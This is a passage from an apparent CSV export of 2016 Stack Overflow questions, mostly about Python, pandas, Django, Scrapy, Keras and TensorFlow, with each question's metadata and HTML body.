        [""c"",""c"",""c"",""d"",""d"",""d""]]
</code></pre>

<p>How would I do it?</p>

<p><em>I am doing it for  spelunky-style map generation</em></p>
"
39698190,6881108.0,2016-09-26 08:38:42+00:00,2,Accessing all function argmuments,"<p>I have a function with 4 arguments and want to check those 4 arguments for something.
Currently I do it like this:</p>

<pre><code>def function1(arg1, arg2, arg3, arg4):
    arg1 = function2(arg1)
    arg2 = function2(arg2)
    arg3 = function2(arg3)
    arg4 = function2(arg4)

def function2(arg):
    arg = dosomething(arg)
    return arg
</code></pre>

<p>I think this is not really a nice way to do it, so my idea is to do something like this:</p>

<pre><code>def function1(arg1, arg2, arg3, arg4):
    for arg in listOfArguments:
        arg = function2(arg)


def function2(arg):
    arg = checkSomething(arg)
    return arg
</code></pre>

<p>Is there a way in Python to get a list of all the arguments passed to <code>function1</code>?</p>

<p>Thanks for your help and ideas.</p>
"
39698045,4467714.0,2016-09-26 08:32:15+00:00,2,Decorators on bound methods with access to class and his ancestors,"<p>When I decorated the bound method in Python class, I need get some info in this decorator from outer class. Is that possible?</p>

<p>For example:</p>

<pre><code>def modifier(func):
    import sys
    cls_namespace = sys._getframe(1).f_locals
    cls_namespace['data']  # dictonary has no key 'data'
    ...
    return func

class Parent:
    data = ""Hi!""

class Child(Parent):

    @modifier
    def method(self):
        pass
</code></pre>

<p>the <code>cls_namespace</code> is just incomplete namespace of current class without <code>data</code> field that I need to get.</p>

<p>Is there ways to get it in decorator?</p>
"
40063776,7024694.0,2016-10-15 20:15:53+00:00,2,Pyhton - Selenium Ubuntu installation,"<p>I've installed Selenium in Ubuntu following the step in the web page <a href=""http://selenium-python.readthedocs.io/installation.html"" rel=""nofollow"">http://selenium-python.readthedocs.io/installation.html</a> but when I try to execute these commands it appears an error.</p>

<pre><code>from selenium import webdriver
driver = webdriver.Firefox()

File ""&lt;stdin&gt;"", line 1, in &lt;module&gt;
File ""/usr/local/lib/python2.7/dist-packages/selenium/webdriver/firefox/webdriver.py"", line 135, in __init__
self.service.start()
File ""/usr/local/lib/python2.7/dist-packages/selenium/webdriver/common/service.py"", line 71, in start
os.path.basename(self.path), self.start_error_message)
selenium.common.exceptions.WebDriverException: Message: 'geckodriver' executable needs to be in PATH.
</code></pre>

<p>Then I read about geckodriver and installed marionette according to this web page <a href=""https://developer.mozilla.org/en-US/docs/Mozilla/QA/Marionette/WebDriver"" rel=""nofollow"">https://developer.mozilla.org/en-US/docs/Mozilla/QA/Marionette/WebDriver</a> but the same error appears.</p>

<p>I downloaded geckodriver I saved it in Downloads, so I uncompressed it and renamed the file to wires. Then I ran in the terminal:</p>

<pre><code>export PATH=$PATH:/home/Me/Downloads/wires
</code></pre>

<p>I don't know what I did wrong, and I really want to use firefox without having to downgrade it.</p>

<p>EDIT: Solved using chromedriver instead of geckodriver.</p>
"
40059994,3679490.0,2016-10-15 14:06:41+00:00,2,Pandas Get a list of index from dataframe.loc,"<p>I have looked through various sites and SO posts.Seems easy but somehow i am stuck with this.I am using</p>

<pre><code>print frame.loc[(frame['RR'].str.contains(""^[^123]"", na=False)), 'RR'].isin(series1.str.slice(1))
</code></pre>

<p>to get</p>

<pre><code>3     True
4    False
8    False
Name: RR, dtype: bool
</code></pre>

<p>Now,somehow i want the <code>indexes</code> only so that i can use that in <code>dataframe.drop</code>. Basically all the indexes where value is <code>True</code> , i have to grab <code>indexes</code> and <code>drop</code> them.Is there any other way as well without using <code>indexes</code>?</p>
"
39691164,3430943.0,2016-09-25 19:51:11+00:00,2,Pandas GroupBy Doesn't Persist After Applying Quantiles?,"<p>I'm trying to get quantiles for two distinct groups in a Pandas df. I'm able to apply to quantiles function and get a table with grouped results, however, I can't seem to call the groupby attributes on the dataframe after doing so. Example:</p>

<pre><code>rand = np.random.RandomState(1)
df = pd.DataFrame({'A': ['foo', 'bar'] * 3,
                   'B': rand.randn(6),
                   'C': rand.randint(0, 20, 6)})
gb = df.groupby(['A'])
gb.groups
</code></pre>

<p>This returns something like:</p>

<pre><code>{'bar': [1, 3, 5], 'foo': [0, 2, 4]}
</code></pre>

<p>Then I apply the quantile function:</p>

<pre><code>q=gb.quantile(np.arange(0,1.1,.1))
</code></pre>

<p>When I print this df, it shows the two groups, but when I try to call them, it throws an error:</p>

<pre><code>q.group
AttributeError: 'DataFrame' object has no attribute 'group'
</code></pre>

<p>How can I call the groups in the quantile dataframe?</p>
"
40060094,6881240.0,2016-10-15 14:15:37+00:00,2,kwargs overriding dict subclass,"<p>A minimal example is as follows:</p>

<pre><code>class sdict(dict):
    class dval:
        def __init__(self, val):
            self.val = val

    def __init__(self, args):
        dictionary = dict(args)
        for k,v in dictionary.items():
            self[k] = v

    def __setitem__(self,key,value):
         try:                   self[key].val = value
         except KeyError:       dict.__setitem__(self,key,self.dval(value))
    def __getitem__(self,key):
         return dict.__getitem__(self,key).val
</code></pre>

<p>Now I can use this class inside a container to override assignment stuff:</p>

<pre><code>class cont(object):
    def __init___(self):
        self._mydict = sdict(())
    @property
    def mydict(self):
        return self._mydict
    @mydict.setter
    def mydict(self,dict_initializor):
        self._mydict = sdict(dict_initializor)
        return self.mydict
</code></pre>

<p>I use this so my container holds a dictionary with pointable primitives (i.e. mutable in python language) but whenever I retrieve the item I get the primitive itself. In my case floats, which I multiply, add etc... Adding __str__/__repr__ functions makes this work when printing these, but for debugging purposes these are omitted.</p>

<p>This works nicely almost everywhere, except when passing this along using kwargs:</p>

<pre><code>def test(a,b): return a*b
c = cont()
c.mydict = {'a':1,'b':2}
print c.mydict['a']+c.mydict['b'],type(c.mydict['a']+c.mydict['b'])
print test(**c.mydict)
</code></pre>

<p>Output:</p>

<pre class=""lang-none prettyprint-override""><code>3 &lt;type 'int'&gt;
Traceback (most recent call last):
  File ""D:\kabanus\workspace\py-modules\test.py"", line 32, in &lt;module&gt;
    print test(**c.mydict)
  File ""D:\kabanus\workspace\py-modules\test.py"", line 28, in test
    def test(a,b): return a*b
TypeError: unsupported operand type(s) for *: 'instance' and 'instance'
</code></pre>

<p>Obviously the unpacking procedure does not use __getitem__ to create values for the keywords. I also attempted to override values() and items() with no success. Next I set all dict methods not defined by me to None to see if any are called - no success either.</p>

<p>Bottom line - how do you get **kwargs unpacking to use __getitem__ or some other method?<br>
Is this even possible?</p>

<p>I also want to avoid defining mul, add, div and so forth if possible in class dval.</p>
"
39691936,4461233.0,2016-09-25 21:17:38+00:00,2,From Raw binary image data to PNG in Python,"<p>After searching for a few hours, I ended up on <a href=""http://stackoverflow.com/questions/32946436/read-img-medical-image-without-header-in-python"">this</a> link. A little background information follows.</p>

<p>I'm capturing live frames of a running embedded device via a hardware debugger. The captured frames are stored as <a href=""http://pasted.co/a60277d7"" rel=""nofollow"">raw binary file</a>s, without headers or format. After looking at the above link and understanding, albeit perfunctorily, the NumPY and Matplotlib, I was able to convert the raw binary data to an image successfully. This is important because I'm not sure if the link to the raw binary file will help any one.</p>

<p>I use this code:</p>

<pre><code>import matplotlib.pyplot as plt # study documentation
import numpy as np              #   ""       "" 

iFile = ""FramebufferL0_0.bin"" # Layer-A
shape = (430, 430) # length and width of the image
dtype = np.dtype('&lt;u2') # unsigned 16 bit little-endian.
oFile = ""FramebufferL0_0.png""

fid = open(iFile, 'rb')
data = np.fromfile(fid, dtype)
image = data.reshape(shape)

plt.imshow(image, cmap = ""gray"")
plt.savefig(oFile)
plt.show()
</code></pre>

<p>Now, the image I'm showing is black and white because the color map is gray-scale (right?). The actual captured frame is NOT black and white. That is, the image I see on my embedded device is ""colorful"".</p>

<p>My question is, how can I calculate actual color of each pixel from the raw binary file? Is there a way I can get the actual color map of the image from the raw binary? I looked into <a href=""http://matplotlib.org/examples/pylab_examples/custom_cmap.html"" rel=""nofollow"">this</a> example and I'm sure that, if I'm able to calculate the R, G and B channels (and Alpha too), I'll be able to recreate the exact image. An example code would be of much help.</p>
"
39695675,6879540.0,2016-09-26 06:04:14+00:00,2,Runge-Kutta 4th Order error approximation for varied time-steps,"<pre><code>from __future__ import division
import numpy as np
import matplotlib.pyplot as plt

def f(x, t):       #function
    return -x

def exact(t):       #exact solution
    return np.exp(-t)

def Rk4(x0, t0, dt):      #Runge-Kutta Fourth Order Error
    t = np.arange(0, 1+dt, dt)
    n = len(t)
    x = np.array([x0]*n)
    x[0],t[0] = x0,t0
    for i in range(n-1):
        h = t[i+1]-t[i]
        k1 = h*f(x[i], t[i])
        k2 = h*f(x[i]+0.5*k1, t[i]+0.5*h)
        k3 = h*f(x[i]+0.5*k2, t[i]+0.5*h)
        k4 = h*f(x[i]+k3, t[i+1])
        x[i+1] = x[i]+(k1+2.0*(k2+k3)+k4 )/6.0
    E = abs(x[n-1]-exact(1))
    return E

vecRk4 = np.vectorize(Rk4)
dt = 10e-4
dtime = []
delta = 10e-4
while dt &lt; 1:
    if Rk4(1.0,0.0,dt) &lt; Rk4(1.0,0.0,dt+delta):
        dtime.append(dt)
    S = vecRk4(1.0,0.0,dtime)
    dt = dt + delta

plt.plot(dtime,S)
plt.xlabel(""dt (s)"")
plt.ylabel(""Error"")
plt.show()
</code></pre>

<p>When I run the code, it results in a jagged plot with spikes that yield zero error at many values of dt, with positive error in-between. (sorry, I can't embed an image of the graph). These large spikes should not be occurring, as there should be a continuous decrease in error as the time-step dt is decreased. However, I'm not sure how to fix this nor do I know where the error results from. I tried eliminating the spikes by adding in the while loop, hoping to have it only add points to my dtime array if the error at dt is larger than the error at dt+delta, but it resulted in precisely the same graph.</p>
"
40062965,3265791.0,2016-10-15 18:53:58+00:00,2,Problems with querying multiindex table in HDF when using data_columns,"<p>I try to query a multi-index table in a pandas HDF store, but it fails when using a query over the index and data_columns at the same time. This only occurs when <code>data_columns=True</code>. Any idea if this is expected, or how to avoid if I don't want to explicitly specify the data_columns?</p>

<p>See the following example, it seems it does not recognize the index as a valid reference: </p>

<pre><code>import pandas as pd
import numpy as np

file_path = 'D:\\test_store.h5'
np.random.seed(1234)
pd.set_option('display.max_rows',4)
# simulate some data
index = pd.MultiIndex.from_product([np.arange(10000,10200),
                                    pd.date_range('19800101',periods=500)],
                                   names=['id','date'])
df = pd.DataFrame(dict(id2=np.random.randint(0, 1000, size=len(index)),
                       w=np.random.randn(len(index))),
                  index=index).reset_index().set_index(['id', 'date'])

# store the data
store =  pd.HDFStore(file_path,mode='a',complib='blosc', complevel=9)
store.append('df_dc_None', df, data_columns=None)
store.append('df_dc_explicit', df, data_columns=['id2', 'w'])
store.append('df_dc_True', df, data_columns=True)
store.close()

# query the data
start = '19810201'
print(pd.read_hdf(file_path,'df_dc_None', where='date&gt;start &amp; id=10000'))
print(pd.read_hdf(file_path,'df_dc_True', where='id2&gt;500'))
print(pd.read_hdf(file_path,'df_dc_explicit', where='date&gt;start &amp; id2&gt;500'))
try:
    print(pd.read_hdf(file_path,'df_dc_True', where='date&gt;start &amp; id2&gt;500'))
except ValueError as err:
    print(err)
</code></pre>
"
39695606,4554446.0,2016-09-26 05:59:32+00:00,2,querying panda df to filter rows where a column is not Nan,"<p>I am new to python and using pandas.</p>

<p>I want to query a dataframe and filter the rows where one of the columns is not <code>NaN</code>.</p>

<p>I have tried:</p>

<pre><code>a=dictionarydf.label.isnull()
</code></pre>

<p>but a is populated with <code>true</code> or <code>false</code>.
Tried this </p>

<pre><code>dictionarydf.query(dictionarydf.label.isnull())
</code></pre>

<p>but gave an error as I expected</p>

<p>sample data:</p>

<pre><code>      reference_word         all_matching_words  label review
0           account             fees - account    NaN      N
1           account           mobile - account    NaN      N
2           account          monthly - account    NaN      N
3    administration  delivery - administration    NaN      N
4    administration      fund - administration    NaN      N
5           advisor             fees - advisor    NaN      N
6           advisor          optimum - advisor    NaN      N
7           advisor              sub - advisor    NaN      N
8             aichi           delivery - aichi    NaN      N
9             aichi               pref - aichi    NaN      N
10          airport              biz - airport    travel      N
11          airport              cfo - airport    travel      N
12          airport           cfomtg - airport    travel      N
13          airport          meeting - airport    travel      N
14          airport           summit - airport    travel      N
15          airport             taxi - airport    travel      N
16          airport            train - airport    travel      N
17          airport         transfer - airport    travel      N
18          airport             trip - airport    travel      N
19              ais                admin - ais    NaN      N
20              ais               alpine - ais    NaN      N
21              ais                 fund - ais    NaN      N
22       allegiance       custody - allegiance    NaN      N
23       allegiance          fees - allegiance    NaN      N
24            alpha               late - alpha    NaN      N
25            alpha               meal - alpha    NaN      N
26            alpha               taxi - alpha    NaN      N
27           alpine             admin - alpine    NaN      N
28           alpine               ais - alpine    NaN      N
29           alpine              fund - alpine    NaN      N
</code></pre>

<p>I want to filter the data where label is not NaN</p>

<p>expected output:</p>

<pre><code>     reference_word         all_matching_words   label    review
0          airport              biz - airport    travel      N
1          airport              cfo - airport    travel      N
2          airport           cfomtg - airport    travel      N
3          airport          meeting - airport    travel      N
4          airport           summit - airport    travel      N
5          airport             taxi - airport    travel      N
6          airport            train - airport    travel      N
7          airport         transfer - airport    travel      N
8          airport             trip - airport    travel      N
</code></pre>
"
39695461,2752265.0,2016-09-26 05:47:45+00:00,2,Finding value of another attribute given an attribute,"<p>I have a CSV that has multiple lines, and I am looking to find the <code>JobTitle</code> of a person, given their name. The CSV is now in a DataFrame <code>sal</code> as such:</p>

<pre><code>id    employee_name    job_title
1     SOME NAME        SOME TITLE    
</code></pre>

<p>I'm trying to find the <code>JobTitle</code> of some given persons name, but am having a hard time doing this. I am currently trying to learn pandas by doing crash courses and I know I can get a list of job titles by using <code>sal['job_title']</code>, but that gives me an entire list of the job titles.</p>

<p><strong>How can I find the value of a specific person?</strong></p>
"
39695046,1850923.0,2016-09-26 05:06:47+00:00,2,linked list output not expected in Python 2.7,"<p>Implement a linked list and I expect output to be <code>0, -1, -2, -3, ... etc.</code>, but it is <code>-98, -98, -98, -98, ... etc.</code>, wondering what is wrong in my code? Thanks.</p>

<pre><code>MAXSIZE = 100
freeListHead = None

class StackNode:
    def __init__(self, value, nextNode):
        self.value = value
        self.nextNode = nextNode

if __name__ == ""__main__"":
    # initialization for nodes and link them to be a free list
    nodes=[StackNode(-1, None)] * MAXSIZE
    freeListHead = nodes[0]
    for i in range(0, len(nodes)-1):
        nodes[i].nextNode = nodes[i+1]
        nodes[i].value = -i
    for node in nodes:
        # output -98, -98, -98, -98, ... etc.
        # exepcted output, 0, -1, -2, -3, ... etc.
        print node.value
</code></pre>
"
39694670,2600455.0,2016-09-26 04:18:59+00:00,2,Queryset filter with three-deep nested models (multiple one-to-many relationships),"<p>I'm trying to figure out how to filter some queries in Django with my models setup something like this:</p>

<pre><code>class Team(models.Model):
    name = models.CharField()

class TeamPosition(models.Model):
    description = models.CharField()
    team = models.ForeignKey(Team)

class Player(models.Model):
    teamposition = models.ForeignKey(TeamPosition)
    team = models.ForeignKey(Team)
    joined_date = models.DateField()
    left_date = models.DateField(blank=True, null=True)
    person = models.ForeignKey(Person)

class Person(models.Model):
    name = models.CharField()
</code></pre>

<p>I'd like to find querysets that answer these questions (moved below for clarity):</p>

<p>If I start at the TeamPosition objects it is much easier to figure out (but doesn't give me a queryset of Teams).</p>

<p>Sample Data set:</p>

<p>Object set 1:</p>

<pre><code>Team(name=""Apples"")
    TeamPosition(team=""Apples"", description=""Forward"")
        Player(team=""Apples"", teamposition=""Forward"", joined_date=""2014-01-01"", left_date=null, person=""Bob"")
    TeamPosition(team=""Apples"", description=""Defense"")
        Player(team=""Apples"", teamposition=""Defense"", joined_date=""2014-01-01"", left_date=2015-01-01, person=""John"")
        Player(team=""Apples"", teamposition=""Defense"", joined_date=""2015-01-01"", left_date=2017-01-01, person=""Paul"")
    TeamPosition(team=""Apples"", description=""Goalie"")
        Player(team=""Apples"", teamposition=""Goalie"", joined_date=""2014-01-01"", left_date=2015-01-01, person=""Jane"")
</code></pre>

<p>Object set 2:</p>

<pre><code>Team(name=""Pears"")
    TeamPosition(team=""Pears"", description=""Forward"")
        Player(team=""Pears"", teamposition=""Forward"", joined_date=""2014-01-01"", left_date=null, person=""Carol"")
    TeamPosition(team=""Pears"", description=""Defense"")
        Player(team=""Pears"", teamposition=""Defense"", joined_date=""2015-01-01"", left_date=2017-01-01, person=""Bill"")
    TeamPosition(team=""Pears"", description=""Goalie"")
        Player(team=""Pears"", teamposition=""Goalie"", joined_date=""2014-01-01"", left_date=null, person=""Susan"")
</code></pre>

<p>Object set 3:</p>

<pre><code>Team(name=""Oranges"")
    TeamPosition(team=""Oranges"", description=""Forward"")
    TeamPosition(team=""Oranges"", description=""Forward"")
    TeamPosition(team=""Oranges"", description=""Goalie"")
</code></pre>

<p>Object set 4:</p>

<pre><code>Team(name=""Bananas"")
    TeamPosition(team=""Bananas"", description=""Forward"")
        Player(team=""Bananas"", teamposition=""Forward"", joined_date=""2014-01-01"", left_date=null, person=""Joe"")
    TeamPosition(team=""Bananas"", description=""Defense"")
        Player(team=""Bananas"", teamposition=""Defense"", joined_date=""2015-01-01"", left_date=2017-01-01, person=""Angela"")
    TeamPosition(team=""Bananas"", description=""Goalie"")
        Player(team=""Bananas"", teamposition=""Goalie"", joined_date=""2014-01-01"", left_date=""2016-09-30"", person=""Kelly"")
</code></pre>

<p>So based on those objects, I'd expect the following results:</p>

<ul>
<li><p>Which Teams have available TeamPositions? (available meaning a TeamPosition without a current Player)</p>

<p><code>Queryset should return Object 1 (Apples) and Object 3 (Oranges)</code></p></li>
<li><p>Which Teams have all TeamPositions full with current Players? (the opposite of above) (current meaning a Player that has either no left_date or a left_date in the future)</p>

<p><code>Queryset should return Object 2 (Pears) and Object 4 (Bananas)</code></p></li>
<li><p>Which Teams will have an empty TeamPosition in 30 days?</p>

<p><code>Queryset should return Object 4 (Bananas)</code></p></li>
</ul>

<p>Hopefully that makes it more clear.</p>

<p>Note: Previously had a car example (hence first response), but it seemed unclear so created a better example</p>
"
40062836,88400.0,2016-10-15 18:42:11+00:00,2,Scrapy XPath Incorrectly when there is Unicode in the page,"<p>I want to get all divs that have category class.</p>

<p>Take a look at this page: www.postkhmer.com/áááááá¶ááá¶áá· </p>

<p><a href=""https://i.stack.imgur.com/WvFAN.jpg"" rel=""nofollow""><img src=""https://i.stack.imgur.com/WvFAN.jpg"" alt=""enter image description here""></a></p>

<p>in scrapy shell: <code>scrapy shell 'www.postkhmer.com/áááááá¶ááá¶áá·'</code></p>

<p><a href=""https://i.stack.imgur.com/KpZUq.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/KpZUq.png"" alt=""enter image description here""></a></p>

<p>As you see I got only 2 elements back. </p>

<p><code>
scrapy fetch --nolog http://www.postkhmer.com/áááááá¶ááá¶áá· &gt; page.html
scrapy shell ./page.html
response.xpath('//div[@class=""category""]')
</code>
Still got only 2 elements back. But when I open page.html in Sublime. </p>

<p>I got 15 matches:
<a href=""https://i.stack.imgur.com/S9J8u.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/S9J8u.png"" alt=""enter image description here""></a></p>

<p>The most interesting part is: when I remove the anchor link from the 2nd category: </p>

<p><a href=""https://i.stack.imgur.com/y1rfG.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/y1rfG.png"" alt=""enter image description here""></a></p>

<p>and i run <code>response.xpath('//div[@class=""category""]')</code> in the scrapy shell again, I got 3 elements:</p>

<p><a href=""https://i.stack.imgur.com/kGRrS.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/kGRrS.png"" alt=""enter image description here""></a></p>

<p>I'm like what the hell!? Can someone help me to solve this problem please?</p>

<p>I've uploaded the file in <a href=""http://www.filedropper.com/scrapypage"" rel=""nofollow"">here</a> incase you want to test locally. </p>
"
39694646,5615811.0,2016-09-26 04:15:04+00:00,2,Building Fortran extension for Python 3.5 or C extension for 2.7,"<p>I have a Python 2.7 project that has thus far been using gfortran and MinGW to build extensions. I use MinGW because it seems to support write statements and allocatable arrays in the Fortran code while MSVC does not.</p>

<p>There is another project I would like to incorporate into my own (Netgen) but it is currently set up for Python 3.5 using Boost.Python. I first tried to transfer my own program to Python 3.5 but that is where I was reminded of the MSVC issues and apparently MinGW is not supported. For that reason, I've been trying to think of a way to compile Netgen + Boost.Python for deployment in Python 2.7.</p>

<p>I think the Boost part is straightforward, but it seems I need Visual C++ 2008 to get it integrated with Python 2.7. I have the Visual C++ Compiler for Python 2.7 from Microsoft, but I haven't gotten it to work inside the CMake build system. I point it to the cl.exe compilers in the VC for Python folders and CMake always tells me that building a simple test program fails. Since I don't actually have (and can't find) Visual Studio 2008, not sure how far I'd get anyway.</p>

<p>There's a lot of places that could have issues here, but I'm just looking for a go/no-go answer if that's what it is. Any solutions would obviously be welcomed.</p>

<p>I am running Windows 10 64-bit.</p>

<p>I'm not a C/C++ expert, but it seems like I have all the tools I need to compile Netgen using the VC for Python tools (cl, link, etc). I just don't have/not sure how to put it all together into a project or something like that.</p>
"
39692999,6854832.0,2016-09-25 23:59:07+00:00,2,If statement executes when it's false,"<p>I am getting ""Knob already attached to a node"" when i try to add a knob</p>

<p>i get this when i try to run my code from menu.py button.. if i run the script from the script editor i don't get the error.. why is that?</p>

<pre><code>for i in nuke.allNodes():
    if not i.knob(""tempMb""):
        if sum0 == 0:
            nuke.message(""first tmp knob created"")
            i.addKnob(t)
        elif sum0 != 0:
            nuke.message(""second tmp knob created"")
    else: 
        nuke.message(""no nob created"")     
</code></pre>

<p>Even though <strong>i check if there is a knob named tempMb</strong> .. it still executes it as if there was not, when there is..
edit: ""t"" is earlier defined as Int_Knob...</p>

<p>Thanks!</p>
"
40062621,1291820.0,2016-10-15 18:19:16+00:00,2,"Drop duplicates for rows with interchangeable name values (Pandas, Python)","<p>I have a DataFrame of form</p>

<pre><code>person1, person2, ..., someMetric
John, Steve, ..., 20
Peter, Larry, ..., 12
Steve, John, ..., 20
</code></pre>

<p>Rows 0 and 2 are interchangeable duplicates, so I'd want to drop the last row. I can't figure out how to do this in Pandas.</p>

<p>Thanks!</p>
"
39693056,4780574.0,2016-09-26 00:09:20+00:00,2,How to use Boolean OR inside a regex,"<p>I want to use a regex to find a substring, followed by a variable number of characters, followed by any of several substrings.</p>

<p>an re.findall of</p>

<pre><code>""ATGTCAGGTAAGCTTAGGGCTTTAGGATT""
</code></pre>

<p>should give me:</p>

<pre><code>['ATGTCAGGTAA', 'ATGTCAGGTAAGCTTAG', 'ATGTCAGGTAAGCTTAGGGCTTTAG']
</code></pre>

<p>I have tried all of the following without success:</p>

<pre><code>import re
string2 = ""ATGTCAGGTAAGCTTAGGGCTTTAGGATT""
re.findall('(ATG.*TAA)|(ATG.*TAG)', string2)
re.findall('ATG.*(TAA|TAG)', string2)
re.findall('ATG.*((TAA)|(TAG))', string2)
re.findall('ATG.*(TAA)|(TAG)', string2)
re.findall('ATG.*(TAA)|ATG.*(TAG)', string2)
re.findall('(ATG.*)(TAA)|(ATG.*)(TAG)', string2)
re.findall('(ATG.*)TAA|(ATG.*)TAG', string2)
</code></pre>

<p>What am I missing here?</p>
"
40057253,5266998.0,2016-10-15 09:16:12+00:00,2,Watch requset in gmail API doesnt work,"<p>I am trying to make a watch request using python referring <a href=""https://developers.google.com/gmail/api/guides/push"" rel=""nofollow"">google APIs</a> but it does not work. </p>

<pre><code>request = {
  'labelIds': ['INBOX'],
  'topicName': 'projects/myproject/topics/mytopic'
}
gmail.users().watch(userId='me', body=request).execute()
</code></pre>

<p>I could not find a library or a package to use <code>gmail.users()</code> function. how to make watch request using an access token</p>
"
40057218,6872163.0,2016-10-15 09:12:39+00:00,2,"Regex expression excluding ""-"" tag","<p>Hi right now my regex expression is working as intended. However i wish to specifically exclude  items such as 
how do i update my regex such that it would exclude entries with ""-\d*""/ negative quantity? ?</p>

<p><a href=""https://regex101.com/r/4EUzLo/1"" rel=""nofollow"">https://regex101.com/r/4EUzLo/1</a></p>
"
40057058,6950525.0,2016-10-15 08:57:43+00:00,2,Correct div-class combination for soup.select(),"<p>I'm developing some scraping code and it keeps returning some errors which i imagine others might be able to help with. </p>

<p>First I run this snippet:</p>

<pre><code>import  pandas as pd
from urllib.parse import urljoin
import requests 

base = ""http://www.reed.co.uk/jobs""

url = ""http://www.reed.co.uk/jobs?datecreatedoffset=Today&amp;pagesize=100""
r = requests.get(url).content
soup = BShtml(r, ""html.parser"")

df = pd.DataFrame(columns=[""links""], data=[urljoin(base, a[""href""]) for a in soup.select(""div.pages a.page"")])
df
</code></pre>

<p>I run this snippet on the first page of today's job postings. And I extract the URLs at the bottom of the page in order to find the total number of pages that exist at that point in time. The below regular expressions take this out for me:</p>

<pre><code>df['partone'] = df['links'].str.extract('([a-z][a-z][a-z][a-z][a-z][a-z]=[0-9][0-9].)', expand=True)
df['maxlink'] = df['partone'].str.extract('([0-9][0-9][0-9])', expand=True)
pagenum = df['maxlink'][4]
pagenum = pd.to_numeric(pagenum, errors='ignore')
</code></pre>

<p>Not on the third line above, the number of pages is always contained within the second from last (out of five) URLs in this list. I'm sure there's a more elegant way of doing this, but it suffices as is. I then feed the number i've taken from the URL into a loop:</p>

<pre><code>result_set = []

loopbasepref = 'http://www.reed.co.uk/jobs?cached=True&amp;pageno='
loopbasesuf = '&amp;datecreatedoffset=Today&amp;pagesize=100'
for pnum in range(1,pagenum):
    url = loopbasepref + str(pnum) + loopbasesuf
    r = requests.get(url).content
    soup = BShtml(r, ""html.parser"")
    df2 = pd.DataFrame(columns=[""links""], data=[urljoin(base, a[""href""]) for a in  soup.select(""div"", class_=""results col-xs-12 col-md-10"")])
    result_set.append(df2)
    print(df2)
</code></pre>

<p>This is where I get an error. What i'm attempting to do is loop through all the pages that list jobs starting at page 1 and going up to page N where N = pagenum, and then extract the URL that links through to each individual job page and store that in a dataframe. I've tried various combinations of <code>soup.select(""div"", class_="""")</code> but receive an error each time that reads: <code>TypeError: select() got an unexpected keyword argument 'class_'</code>.</p>

<p>If anyone has any thoughts about this, and can see a good way forward, i'd appreciate the help!</p>

<p>Cheers</p>

<p>Chris</p>
"
40055225,1516226.0,2016-10-15 05:15:07+00:00,2,How to create a loss function which changes over epoch in Keras,"<p>I would like to create a custom loss function that has a weight term that's updated based on what epoch I'm in.</p>

<p>For example:
Let's say I have a loss function which has a <code>beta</code> weight, where beta increases over the first 20 epochs...</p>

<pre><code>def custom_loss(x, x_pred): 
    loss1 = objectives.binary_crossentropy(x, x_pred)
    loss2 = objectives.mse(x, x_pred)
    return (beta*current_epoch/20) * loss1 + loss2
</code></pre>

<p>How could I implement something like this into a keras loss function?</p>
"
40054935,6902832.0,2016-10-15 04:26:06+00:00,2,How do you install Tensorflow on Windows?,"<p>I am trying to install Tensorflow on Windows. </p>

<p>I have Anaconda 4.2.0. I tried running </p>

<pre><code>conda create -n tensorflow python=3.5
</code></pre>

<p>in my command prompt. This seemed to do something, but I'm not sure what this accomplished. It created a folder within the Anaconda3 program in my username folder. </p>

<p><a href=""https://i.stack.imgur.com/1AUIU.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/1AUIU.png"" alt=""enter image description here""></a></p>

<p>This folder is filled with the following content:</p>

<p><a href=""https://i.stack.imgur.com/X8JL6.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/X8JL6.png"" alt=""enter image description here""></a></p>

<p>Over the summer, I used mainly Jupyter Notebooks to do my python coding. Within this environment, there is a tab marked <code>Condas</code></p>

<p><a href=""https://i.stack.imgur.com/DFYBa.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/DFYBa.png"" alt=""enter image description here""></a></p>

<p>So it looks like I should be able to switch to the Tensorflow environment. But this doesn't work when I try to switch, there is no option to change my kernel to a Tensorflow one. 
<a href=""https://i.stack.imgur.com/gIBIY.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/gIBIY.png"" alt=""enter image description here""></a></p>

<p>I tried running </p>

<pre><code>conda search tensorflow
</code></pre>

<p><a href=""https://i.stack.imgur.com/UAH96.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/UAH96.png"" alt=""enter image description here""></a></p>

<p>But nothing appears. </p>

<p>I'm not sure what to do. I asked a few grad students in my economics research group, but they weren't sure what to do either. </p>

<h1>My Question</h1>

<p>How do I properly install Tensorflow on Windows?</p>
"
39686132,1479974.0,2016-09-25 11:05:21+00:00,2,Pandas: How to open certain files,"<p>I am currently working on the data set from this <a href=""https://github.com/smarthi/UnivOfWashington-Machine-Learning/tree/master/MLFoundations/week4/people_wiki.gl"" rel=""nofollow"">link</a>. But I am unable to read these files from Pandas? Has anyone tried to play with such files?</p>

<p>I am trying the following:</p>

<pre><code>import pandas as pd

df = pd.read_csv(""m_4549381c276b46c6.0000"")
</code></pre>

<p>But I get the following error</p>

<pre><code>Error tokenizing data. C error: Buffer overflow caught - possible malformed input file.
</code></pre>
"
39705175,3878716.0,2016-09-26 14:11:10+00:00,2,"loss function as min of several points, custom loss function and gradient","<p>I am trying to predict quality of metal coil. I have the metal coil with width 10 meters and length from 1 to 6 kilometers. As training data I have ~600 parameters measured each 10 meters, and final quality control mark - good/bad (for whole coil). Bad means there is at least 1 place there is coil is bad, there is no data where is exactly. I have data for approx 10000 coils.</p>

<p>Lets imagine we want to train logistic regression for this data(with 2 factors).</p>

<pre><code>X = [[0, 0],
      ...
     [0, 0],
     [1, 1], # coil is actually broken here, but we don't know it yet.
     [0, 0],
      ...
     [0, 0]]

Y = ?????
</code></pre>

<p>I can't just put all ""bad"" in Y and run classifier, because I will be confusing for classifier. I can't put all ""good"" and one ""bad"" in Y becuase I don't know where is the bad position. </p>

<p>The solution I have in mind is the following, I could define loss function as <strong>sum( (Y-min(F(x1,x2)))^2 )</strong> (min calculated by all F belonging to one coil) not <strong>sum( (Y-F(x1,x2))^2 )</strong>. In this case probably I get F trained correctly to point bad place. I need gradient for that, it there is impossible to calculate it in all points, the min is not differentiable in all places, but I could use weak gradient instead(using values of functions which is minimal in coil in every place). </p>

